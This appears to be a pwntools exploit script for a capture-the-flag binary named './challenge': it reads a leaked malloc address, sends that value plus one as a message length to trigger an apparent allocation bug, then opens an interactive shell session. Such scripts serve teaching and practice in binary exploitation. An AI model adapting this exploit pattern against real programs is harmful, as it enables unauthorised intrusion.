from pwn import *
import time

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
///
'''.format(**locals())

exe = './challenge'
elf = context.binary = ELF(exe,checksec=True)
context.log_level = 'debug'

io = start()

io.recvuntil(b'Leak: ')
leak = int(io.recvline(), 16)

log.success(f"Leaked malloc address: {hex(leak)}")

io.sendlineafter(b'Length of your message: ', str(leak + 1))
io.sendlineafter(b'Enter your message: ', "cool")

io.interactive()

